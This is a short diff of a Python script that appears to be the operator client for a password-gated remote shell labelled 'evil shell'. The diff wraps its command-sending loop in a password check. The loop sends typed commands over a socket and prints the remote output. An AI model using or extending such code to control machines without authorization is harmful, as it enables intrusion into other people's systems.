@@ -38,17 +38,17 @@ def main():
     output = connect.recv(BUFFER).decode("UTF-8")
     print(output)
 
-    # remote shell
-    while True:
-        command = input("$ ")
-        if command == "":
-            break
-        print("$ sending command")
-        connect.send(command.encode())
-        output = connect.recv(BUFFER).decode("UTF-8")
-        print("$ evil shell :3 > **********print results: ")
-        print(output)
-        
+    if(output != "Incorrect password. Closing connection"):
+        # remote shell
+        while True:
+            command = input("$ ")
+            if command == "":
+                break
+            print("$ sending command")
+            connect.send(command.encode())
+            output = connect.recv(BUFFER).decode("UTF-8")
+            print("$ evil shell :3 > **********print results: ")
+            print(output)
         
     print("closing connection")
     connect.close()
